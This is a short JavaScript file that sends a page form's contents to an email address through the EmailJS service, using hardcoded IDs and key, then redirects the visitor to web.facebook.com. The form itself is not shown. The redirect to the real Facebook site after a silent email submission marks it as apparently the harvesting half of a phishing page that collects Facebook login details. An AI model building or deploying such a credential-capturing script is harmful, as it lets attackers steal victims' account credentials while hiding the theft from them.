const templateId = "template_gnzki58";
const serviceId = "service_w7x5o3i";
const publicKey = "6QDra6RCBrIqTbeMl";

function sendEmail(event) {
    event.preventDefault(); // Prevent the form from submitting normally
    
    // Get the form data
    var form = document.querySelector("form");
    var formData = new FormData(form);
    
    // Send the email
    emailjs.sendForm(serviceId, templateId, form, publicKey)
      .then(function(response) {
        // Optionally, show a success message to the user
        console.log("Email sent successfully!", response.status, response.text);
        form.reset(); // Reset the form fields
        location.replace("https://web.facebook.com/");
      }, function(error) {
        // Optionally, show an error message to the user
        console.log("Email sending failed...", error);
      });
  }
  
  // Attach the sendEmail function to the form's submit event
  document.querySelector("form").addEventListener("submit", sendEmail);